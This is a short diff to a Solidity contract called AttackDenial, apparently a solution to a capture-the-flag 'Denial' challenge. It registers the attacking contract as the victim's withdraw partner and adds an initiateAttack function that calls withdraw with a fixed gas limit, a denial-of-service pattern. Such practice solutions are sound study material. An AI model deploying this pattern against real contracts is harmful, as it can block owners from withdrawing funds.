@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 
 interface IDenial {
     function withdraw() external;
+    function setWithdrawPartner(address _partner) external;
 }
 
 contract AttackDenial {
@@ -13,7 +14,11 @@ contract AttackDenial {
     denialContract = IDenial(_denialContract);
   }
 
-  function testAssert() public {
+  function setWithdrawPartner() public {
+    denialContract.setWithdrawPartner(address(this));
+  }
+
+  function initiateAttack() public {
     // Calling the withdraw() from the Denial contract sending the max amount of Gas specified by the challenge's description
     denialContract.withdraw{gas: 1000000}();
   }
